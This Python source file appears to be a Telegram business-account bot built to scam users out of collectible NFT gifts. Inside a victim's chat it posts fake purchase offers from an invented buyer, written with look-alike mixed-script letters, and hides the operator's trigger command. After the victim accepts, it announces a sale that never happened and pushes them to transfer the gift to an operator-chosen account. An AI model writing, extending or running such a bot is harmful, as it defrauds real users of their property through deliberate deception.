import asyncio
import random
import logging
import os
import html
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramRetryAfter

print("TEST PRINT WORKS", flush=True)
print("AIROGRAM VERSION:", __import__("aiogram").__version__)
print("DELETE BUSINESS METHOD:", hasattr(Bot, "delete_business_messages"))

TOKEN = os.getenv("BOT_TOKEN")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN не задан")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

message_queue = asyncio.Queue()
client_user_ids = {}

_store: dict[str, dict] = {}
_key_counter = 0

def new_key():
    global _key_counter
    _key_counter += 1
    return str(_key_counter)

user_recipients = {}
current_recipient = {"username": "maqqa"}

def get_recipient(user_id: int):
    return user_recipients.get(user_id, "maqqa")

LOCALES = {
    "ru": {
        "offer_text": 'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "btn_transfer": "Пеρедать",
        "btn_confirm": "Пοдтвеρдить пepeдачу",
        "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
    },
    "eng": {
        "offer_text": 'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "btn_transfer": "Transfer",
        "btn_confirm": "Confirm transfer",
        "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
    },
    "ukr": {
        "offer_text": 'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
        "btn_decline": "Відхилити",
        "btn_accept": "Прийняти",
        "btn_transfer": "Передати",
        "btn_confirm": "Підтвердити передачу",
        "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
    },
    "cn": {
        "offer_text": '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "btn_transfer": "转移",
        "btn_confirm": "确认转移",
        "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
    }
}

def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
    slug = gift_name.replace(" ", "")
    loc = LOCALES.get(lang, LOCALES["ru"])

    if currency_type.lower() == "gram":
        currency_emoji = '<tg-emoji emoji-id="5298988357538328017">💎</tg-emoji>'
    else:
        currency_emoji = '<tg-emoji emoji-id="5920433463428650761">⭐️</tg-emoji>'

    return loc["offer_text"].format(
        amount=html.escape(str(amount)),
        currency_emoji=currency_emoji,
        slug=html.escape(slug, quote=True),
        gift_name=html.escape(str(gift_name)),
        gift_num=html.escape(str(gift_num))
    )

def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang, key):
    loc = LOCALES.get(lang, LOCALES["ru"])
    cb_data = f"a|{key}"
    decline_data = f"d|{key}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=loc['btn_decline'], callback_data=decline_data, icon_custom_emoji_id="5778527486270770928"),
                InlineKeyboardButton(text=loc['btn_accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
            ]
        ]
    )

def make_accept_keyboard(lang, recipient):
    loc = LOCALES.get(lang, LOCALES["ru"])
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
            [InlineKeyboardButton(text=loc['btn_confirm'], callback_data="noop")],
        ]
    )

def main_menu_keyboard():
    recipient = current_recipient["username"]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"👤 Получатель: @{recipient}", callback_data="show_recipient")],
            [InlineKeyboardButton(text="✏️ Изменить получателя", callback_data="change_recipient")],
        ]
    )

@dp.message(F.chat.type == "private", F.text == "/start")
async def handle_start(message: Message):
    recipient = current_recipient["username"]
    await message.answer(
        f"✅ Бот работает\n\n"
        f"👤 Текущий получатель НФТ: <b>@{recipient}</b>\n\n"
        f"Для смены получателя нажми кнопку ниже или отправь:\n"
        f"<code>/set @username</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_keyboard()
    )

@dp.message(F.chat.type == "private", F.text.startswith("/set"))
async def handle_set_recipient(message: Message):
    parts = message.text.strip().split()

    # Проверяем точное имя команды
    if parts[0].split("@")[0] != "/set":
        return

    if len(parts) != 2:
        await message.answer(
            "Использование: <code>/set @username</code>",
            parse_mode=ParseMode.HTML
        )
        return

    username = parts[1].lstrip("@")

    if not username or not (
        5 <= len(username) <= 32
        and username[0].isascii()
        and username[0].isalpha()
        and all(
            ch.isascii() and (ch.isalnum() or ch == "_")
            for ch in username
        )
    ):
        await message.answer("Некорректный username.")
        return

    current_recipient["username"] = username

    await message.answer(
        f"✅ Получатель изменён на <b>@{username}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_keyboard()
    )

@dp.message(F.chat.type == "private")
async def handle_private(message: Message):
    await message.answer("Бот работает. Напиши /start для настройки.")

@dp.callback_query(F.data == "show_recipient")
async def cb_show_recipient(cb: CallbackQuery):
    await cb.answer(f"Текущий получатель: @{current_recipient['username']}", show_alert=True)

@dp.callback_query(F.data == "change_recipient")
async def cb_change_recipient(cb: CallbackQuery):
    await cb.answer()
    await cb.message.answer(
        "Отправь новый юзернейм:\n<code>/set @username</code>",
        parse_mode=ParseMode.HTML
    )

@dp.business_message(F.text)
async def handle_business_command(message: Message):
    if not message.text:
        return
    text_clean = message.text.strip()
    if not text_clean.lower().startswith(".buy"):
        return

    parts = text_clean.split()
    bcid = message.business_connection_id
    chat_id = message.chat.id

    if message.from_user:
        client_user_ids[chat_id] = message.from_user.id

    if len(parts) < 3:
        return

    raw_nft_part = next((p for p in parts if "t.me/nft/" in p), None)
    if not raw_nft_part:
        return

    text_lower = text_clean.lower()
    currency_type = "gram" if "gram" in text_lower else "stars"

    amount_str = next(
        (p for p in parts if p.isascii() and p.isdigit()),
        None
    )

    if amount_str is None or int(amount_str) <= 0:
        logging.warning("Invalid offer amount")
        return

    amount = int(amount_str)

    lang = "ru"
    for l in ["ukr", "eng", "cn", "ru"]:
        if l in parts or l in text_lower.split():
            lang = l
            break

    try:
        clean_url = raw_nft_part.split("?")[0].rstrip("/")
        slug_part = clean_url.split("/nft/")[-1]
        if "-" in slug_part:
            gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
            gift_num = int(gift_num_str)
            gift_name = gift_name_raw.replace("-", " ")
        else:
            return
    except Exception as e:
        logging.error(f"Parse error: {e}")
        return

    await message_queue.put({
        "chat_id": chat_id,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "amount": amount,
        "currency_type": currency_type,
        "lang": lang,
        "bcid": bcid,
        "cmd_message_id": message.message_id,
        "recipient": current_recipient["username"],
    })

@dp.callback_query(F.data.startswith("a|"))
async def accept_offer(cb: CallbackQuery):
    
    parts = cb.data.split("|")

    if len(parts) != 2:
        await cb.answer("Ошибка данных.", show_alert=True)
        return

    _, key = parts
    stored = _store.get(key)

    if not stored:
        await cb.answer("Оффер устарел или уже обработан.", show_alert=True)
        return

    slug = html.escape(str(stored["slug"]))
    gift_num = str(stored["gift_num"])
    amount = html.escape(str(stored["amount"]))
    currency_type = stored["currency_type"]

    if not gift_num.isascii() or not gift_num.isdigit():
        await cb.answer("Некорректный номер подарка.", show_alert=True)
        return

    currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"

    chat_id = cb.message.chat.id
    message_id = cb.message.message_id
    bcid = cb.message.business_connection_id

    gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'

    text = (
        f"{gift_emoji} <b><a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug}-{gift_num}</a></b> ycпeшнo пpoдaн!\n\n"
        f"<b>• Пepeдaйтe пoкyпaтeлю для зaчиcлeния {currency_name}.</b>"
    )

    await cb.answer("Предложение принято.", show_alert=True)

    # Удаляем старое сообщение с кнопками
    try:
        if bcid:
            await bot.delete_business_messages(
                business_connection_id=bcid,
                message_ids=[message_id]
            )
        else:
            await bot.delete_message(
                chat_id=chat_id,
                message_id=message_id
            )
    except Exception as e:
        logging.error(f"Delete old card error: {e}")

    await asyncio.sleep(random.uniform(0.5, 1.0))

    # Отправляем тестовое уведомление
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode=ParseMode.HTML,
            business_connection_id=bcid if bcid else None
        )
    except Exception as e:
        logging.error(f"Send accepted message error: {e}")
    finally:
        _store.pop(key, None)


@dp.callback_query(F.data.startswith("d|"))
async def decline_offer(cb: CallbackQuery):
    parts = cb.data.split("|")

    if len(parts) != 2:
        await cb.answer("Ошибка данных.", show_alert=True)
        return

    _, key = parts

    stored = _store.get(key)

    if not stored:
        await cb.answer(
            "Оффер устарел или уже обработан.",
            show_alert=True
        )
        return

    chat_id = stored["chat_id"]
    message_id = stored["message_id"]
    bcid = stored.get("bcid")

    await cb.answer("Предложение отклонено.")

    # Удаляем сообщение с оффером
    try:
        if bcid:
            await bot.delete_business_messages(
                business_connection_id=bcid,
                message_ids=[message_id]
            )
        else:
            await bot.delete_message(
                chat_id=chat_id,
                message_id=message_id
            )
    except Exception as e:
        logging.error(f"Delete declined offer error: {e}")

    _store.pop(key, None)


@dp.callback_query(F.data == "noop")
async def noop_handler(cb: CallbackQuery):
    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)

@dp.callback_query()
async def catch_all_callbacks(cb: CallbackQuery):
    logging.warning(f"[CB DIAGNOSTIC] unhandled data={cb.data!r} chat={cb.message.chat.id if cb.message else None}")
    await cb.answer()

async def sender_worker():
    while True:
        task = await message_queue.get()

        try:
            await asyncio.sleep(random.uniform(0.5, 1.0))

            key = new_key()

            text = build_offer_text(
                task["gift_name"],
                task["gift_num"],
                task["amount"],
                task["currency_type"],
                task["lang"]
            )

            keyboard = make_offer_keyboard(
                task["gift_name"],
                task["gift_num"],
                task["amount"],
                task["currency_type"],
                task["lang"],
                key
            )

            sent_msg = await bot.send_message(
                chat_id=task["chat_id"],
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                business_connection_id=task["bcid"],
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False,
                    show_above_text=True
                )
            )

            if sent_msg:
                _store[key] = {
                    "bcid": task["bcid"],
                    "chat_id": task["chat_id"],
                    "recipient": task["recipient"],
                    "lang": task["lang"],
                    "message_id": sent_msg.message_id,
                    "slug": task["gift_name"].replace(" ", ""),
                    "gift_num": task["gift_num"],
                    "amount": task["amount"],
                    "currency_type": task["currency_type"],
                }

                try:
                    if task["bcid"]:
                        await bot.delete_business_messages(
                            business_connection_id=task["bcid"],
                            message_ids=[task["cmd_message_id"]]
                        )
                    else:
                        await bot.delete_message(
                            chat_id=task["chat_id"],
                            message_id=task["cmd_message_id"]
                        )

                except Exception:
                    pass

        except TelegramRetryAfter as e:
            wait_time = e.retry_after + 1

            logging.warning(
                "Telegram flood control: waiting %s seconds. Chat: %s",
                wait_time,
                task["chat_id"]
            )

            task["_retry_count"] = task.get("_retry_count", 0) + 1

            if task["_retry_count"] <= 3:
                await asyncio.sleep(wait_time)
                await message_queue.put(task)
            else:
                logging.error(
                    "Task failed after 3 retries. Chat: %s",
                    task["chat_id"]
                )

        except Exception as e:
            logging.exception(
                "Worker error in chat %s: %s",
                task.get("chat_id"),
                e
            )

        finally:
            message_queue.task_done()

async def main():
    asyncio.create_task(sender_worker())
    await dp.start_polling(bot, allowed_updates=["callback_query", "business_connection", "business_message", "message"])

if __name__ == "__main__":
    asyncio.run(main())
